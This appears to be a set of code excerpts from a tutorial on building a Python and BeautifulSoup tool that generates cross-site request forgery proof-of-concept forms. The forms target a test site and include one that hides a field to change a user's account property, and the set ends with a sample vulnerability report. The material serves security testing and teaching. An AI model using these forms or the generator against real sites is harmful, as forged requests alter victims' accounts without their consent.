["```\n<html>\n    <form enctype=\"application/x-www-form-urlencoded\" method=\"POST\" action=\"http://webscantest.com/crosstraining/aboutyou.php\">\n        <label>fname</label><input type=\"text\" value=\"William\" name=\"fname\">\n        <label>nick</label><input type=\"text\" value=\"Private Mandella\" name=\"nick\">\n        <label>lname</label><input type=\"text\" value=\"Mandella\" name=\"lname\">\n        <label>submit</label><input type=\"text\" value=\"submit\" name=\"submit\">\n        <input type=\"submit\" value=\"http://webscantest.com/crosstraining/aboutyou.php\">\n    </form>\n</html>\n```", "```\n<html>\n    <form enctype=\"application/x-www-form-urlencoded\" method=\"POST\" action=\"http://webscantest.com/crosstraining/aboutyou.php\">\n        <label>fname</label><input type=\"text\" value=\"William\" name=\"fname\">\n        <label>nick</label><input type=\"text\" value=\"Major Mandella\" name=\"nick\">\n        <label>lname</label><input type=\"text\" value=\"Mandella\" name=\"lname\">\n        <label>submit</label><input type=\"text\" value=\"submit\" name=\"submit\">\n        <input type=\"submit\" value=\"http://webscantest.com/crosstraining/aboutyou.php\">\n    </form>\n</html>\n```", "```\n<html>\n    <form enctype=\"application/x-www-form-urlencoded\" method=\"POST\" action=\"http://webscantest.com/crosstraining/aboutyou.php\">\n        <label>fname</label><input type=\"text\" value=\"William\" name=\"fname\">\n        <label>nick</label><input type=\"text\" value=\"Private Mandella\" name=\"other-nick\">\n        <label>lname</label><input type=\"text\" value=\"Mandella\" name=\"lname\">\n        <label>submit</label><input type=\"text\" value=\"submit\" name=\"submit\">\n        <input type=\"submit\" value=\"http://webscantest.com/crosstraining/aboutyou.php\">\n        <input type=\"hidden\" value=\"Major Mandella\" name=\"nick\">\n    </form>\n</html>\n```", "```\n#!/usr/bin/env python3\n\nmethod=\"POST\"\nencoding_type=\"application/x-www-form-urlencoded\"\naction=\"http://webscantest.com/crosstraining/aboutyou.php\"\nfields = [\n    {\n        \"type\":\"text\",\n        \"name\":\"fname\",\n        \"label\":\"fname\"\n    },\n    {\n        \"type\":\"text\",\n        \"name\":\"lname\",\n        \"label\":\"lname\"\n    },\n    {\n        \"type\":\"text\",\n        \"name\":\"nick\",\n        \"label\":\"nick\"\n    }\n]\n```", "```\nfrom bs4 import BeautifulSoup, Tag\n\ncontent = BeautifulSoup(\"<html></html>\", \"html.parser\")\n\nprint(content.prettify())\n```", "```\nhtml_tag = content.find(\"html\")\nform_tag = content.new_tag(\"form\")\nhtml_tag.append(form_tag)\n```", "```\nfor field in fields:\n    field_tag = content.new_tag(\"input\")\n    form_tag.append(field_tag)\n```", "```\nfor field in fields:\n    field_tag = content.new_tag(\"input\", type=field['type'])\n    field_tag['name'] = field['name']\n    form_tag.append(field_tag)\n```", "```\nsubmit_tag = content.new_tag(\"input\", type=\"submit\", value=\"submit\")\nform_tag.append(submit_tag)\n```", "```\n<html>\n <form>\n  <input name=\"fname\" type=\"text\"/>\n  <input name=\"lname\" type=\"text\"/>\n  <input name=\"nick\" type=\"text\"/>\n  <input type=\"submit\" value=\"submit\"/>\n </form>\n</html>\n```", "```\n#!/usr/bin/env python3\nfrom bs4 import BeautifulSoup\n\ndef generate_poc():\n    method=\"POST\"\n    encoding_type=\"application/x-www-form-urlencoded\"\n    action=\"http://webscantest.com/crosstraining/aboutyou.php\"\n    fields = [\n        {\n            \"type\":\"text\",\n            \"name\":\"fname\",\n            \"label\":\"fname\",\n            \"value\":\"William\"\n        },\n        {\n            \"type\":\"text\",\n            \"name\":\"lname\",\n            \"label\":\"lname\",\n            \"value\":\"Mandella\"\n        },\n        {\n            \"type\":\"text\",\n            \"name\":\"nick\",\n            \"label\":\"nick\",\n            \"value\":\"Major Mandella\"\n        }\n    ]\n\n    content = BeautifulSoup(\"<html></html>\", \"html.parser\")\n    html_tag = content.find(\"html\")\n    form_tag = content.new_tag(\"form\", action=action, method=method, enctype=encoding_type)\n    html_tag.append(form_tag)\n\n    for field in fields:\n        label_tag = content.new_tag('label')\n        label_tag.string = field['label']\n        field_tag = content.new_tag(\"input\", type=field['type'], value=field['value'])\n        field_tag['name'] = field['name']\n        form_tag.append(label_tag)\n        form_tag.append(field_tag)\n\n    submit_tag = content.new_tag(\"input\", type=\"submit\", value=action)\n    form_tag.append(submit_tag)\n\n    return content.prettify()\n\nif __name__ == \"__main__\":\n    print(generate_poc())\n```", "```\n<html>\n <form action=\"http://webscantest.com/crosstraining/aboutyou.php\" enctype=\"application/x-www-form-urlencoded\" method=\"POST\">\n  <label>fname</label><input name=\"fname\" type=\"text\" value=\"William\"/>\n  <label>lname</label><input name=\"lname\" type=\"text\" value=\"Mandella\"/>\n  <label>nick</label><input name=\"nick\" type=\"text\" value=\"Major Mandella\"/>\n  <input type=\"submit\" value=\"http://webscantest.com/crosstraining/aboutyou.php\"/>\n </form>\n</html>\n```", "```\n#!/usr/bin/env python3\nimport sys\nimport ast\n\nfrom bs4 import BeautifulSoup, Tag\n\ndef generate_poc():\n    method=sys.argv[1]\n    encoding_type=sys.argv[2]\n    action=sys.argv[3]\n    fields = ast.literal_eval(sys.argv[4])\n```", "```\npython code/csrf_poc_generator.py \"POST\" \"application/x-www-form-urlencoded\" \"http://webscantest.com/csrf/csrfpost.php\" \"[{ 'type':'text', 'name':'property', 'label':'color', 'value':''}]\"\n```", "```\n<html>\n <form action=\"http://webscantest.com/csrf/csrfpost.php\" enctype=\"application/x-www-form-urlencoded\" method=\"POST\">\n  <label>\n   color\n  </label>\n  <input name=\"property\" type=\"text\" value=\"\"/>\n  <input type=\"submit\" value=\"http://webscantest.com/csrf/csrfpost.php\"/>\n </form>\n</html>\n```", "```\n<html>\n <form action=\"http://webscantest.com/csrf/csrfpost.php\" enctype=\"application/x-www-form-urlencoded\" method=\"POST\">\n  <label>\n   color\n  </label>\n  <input name=\"dummy-property\" type=\"text\" value=\"\"/>\n  <input name=\"property\" type=\"hidden\" value=\"Peasoup\">\n  <input type=\"submit\" value=\"http://webscantest.com/csrf/csrfpost.php\"/>\n </form>\n</html>\n```", "```\n#!/usr/bin/env python3\nimport sys\nimport ast\n\nfrom bs4 import BeautifulSoup, Tag\n\ndef generate_poc(method, encoding_type, action, fields):\n    \"\"\" Generate a CSRF PoC using basic form data \"\"\"\n    content = BeautifulSoup(\"<html></html>\", \"html.parser\")\n    html_tag = content.find(\"html\")\n    form_tag = content.new_tag(\"form\", action=action, method=method, enctype=encoding_type)\n    html_tag.append(form_tag)\n\n    for field in fields:\n        label_tag = content.new_tag('label')\n        label_tag.string = field['label']\n        field_tag = content.new_tag(\"input\", type=field['type'], value=field['value'])\n        field_tag['name'] = field['name']\n        form_tag.append(label_tag)\n        form_tag.append(field_tag)\n\n    submit_tag = content.new_tag(\"input\", type=\"submit\", value=action)\n    form_tag.append(submit_tag)\n\n    return content.prettify()\n\nif __name__ == \"__main__\":\n    method=sys.argv[1]\n    encoding_type=sys.argv[2]\n    action=sys.argv[3]\n    fields = ast.literal_eval(sys.argv[4])\n    print(generate_poc(method, encoding_type, action, fields))\n```", "```\nhttp://webscantest.com/csrf/csrfpost.php\n```", "```\nCATEGORY: CSRF POST-based attack\n\nTIME: 2018-07-22 17:27 (17:27) UTC\n\nURL: http://webscantest.com/csrf/csrfpost.php\n\nPAYLOAD: Peasoup\n\nMETHODOLOGY: Vulnerability detected with generated CSRF PoC included in reproduction instructions.\n\nINSTRUCTIONS TO REPRODUCE:\n\n1\\. Open the following CSRF PoC into a browser either locally or through a hosted environment:\n\n<html>\n <form action=\"http://webscantest.com/csrf/csrfpost.php\" enctype=\"application/x-www-form-urlencoded\" method=\"POST\">\n  <label>\n   color\n  </label>\n  <input name=\"dummy-property\" type=\"text\" value=\"\"/>\n  <input name=\"property\" type=\"hidden\" value=\"Peasoup\">\n  <input type=\"submit\" value=\"http://webscantest.com/csrf/csrfpost.php\"/>\n </form>\n</html>\n\n2\\. Submit the form contained in the CSRF PoC.\n\nATTACK SCENARIO:\nIn the case of this POST-based CSRF attack, the vulnerability gives the attacker the opportunity to change a piece of the user's account information if they unwittingly submit the attacker's form. Giving a user a Peasoup-colored car instead of a flashy Cyan one would be a breach of the user's trust and a threat to the company's online ordering system and general bottom line.\n```"]